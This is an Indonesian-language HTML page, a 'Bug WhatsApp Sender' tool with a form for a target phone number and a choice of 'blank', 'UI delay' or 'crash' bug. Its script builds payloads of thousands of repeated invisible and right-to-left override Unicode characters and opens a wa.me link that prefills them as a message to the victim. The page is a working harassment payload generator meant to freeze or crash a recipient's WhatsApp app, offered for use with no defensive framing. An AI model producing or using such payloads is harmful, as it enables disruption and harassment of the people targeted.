<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <title>Bug WhatsApp Sender</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
  <style>
    * {
      box-sizing: border-box;
    }
    body {
      font-family: 'Poppins', sans-serif;
      background: #0f1115;
      color: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 40px 20px;
      min-height: 100vh;
    }
    h2 {
      font-size: 26px;
      margin-bottom: 30px;
      color: #25D366;
    }
    input, select, button {
      width: 100%;
      max-width: 400px;
      margin: 10px 0;
      padding: 15px;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      font-family: inherit;
    }
    input, select {
      background: #1f1f24;
      color: #fff;
    }
    button {
      background: #25D366;
      color: #000;
      font-weight: bold;
      transition: 0.3s ease;
      cursor: pointer;
    }
    button:hover {
      background: #1ebe5d;
      transform: scale(1.05);
    }
    .container {
      width: 100%;
      max-width: 420px;
      background: #191b1f;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 0 30px rgba(0, 255, 100, 0.1);
    }
    .label {
      text-align: left;
      width: 100%;
      max-width: 400px;
      font-weight: 600;
      margin-top: 15px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>üß® Bug WhatsApp Sender</h2>

    <div class="label">üì± Nomor Target (awali 62):</div>
    <input id="nomor" placeholder="Contoh: 6281234567890" />

    <div class="label">üí£ Jenis Bug:</div>
    <select id="jenis">
      <option value="blank">üï≥Ô∏è Blank Text</option>
      <option value="ui">üê¢ UI Delay</option>
      <option value="crash">üí• Crash Ringan</option>
    </select>

    <button onclick="kirim()">üöÄ KIRIM SEKARANG</button>
  </div>

  <script>
    function getBug(type) {
      let bug1 = "\u3164\u3164\u3164\u3164\u3164".repeat(3000); // Blank
      let bug2 = "\u200F\u202E\u2063\u3164".repeat(4000);       // UI Delay
      let bug3 = "\u202E\u202E\u202E\u202E".repeat(2000) + "üîí".repeat(300); // Crash

      if (type === "blank") return bug1;
      if (type === "ui") return bug2;
      if (type === "crash") return bug3;
    }

    function kirim() {
      const nomor = document.getElementById("nomor").value.trim();
      const jenis = document.getElementById("jenis").value;
      const bug = encodeURIComponent(getBug(jenis));

      if (!/^62\\d{8,15}$/.test(nomor)) {
        alert("Masukkan nomor yang valid diawali 62 tanpa spasi atau +");
        return;
      }

      window.open(`https://wa.me/${nomor}?text=${bug}`, "_blank");
    }
  </script>
</body>
</html>
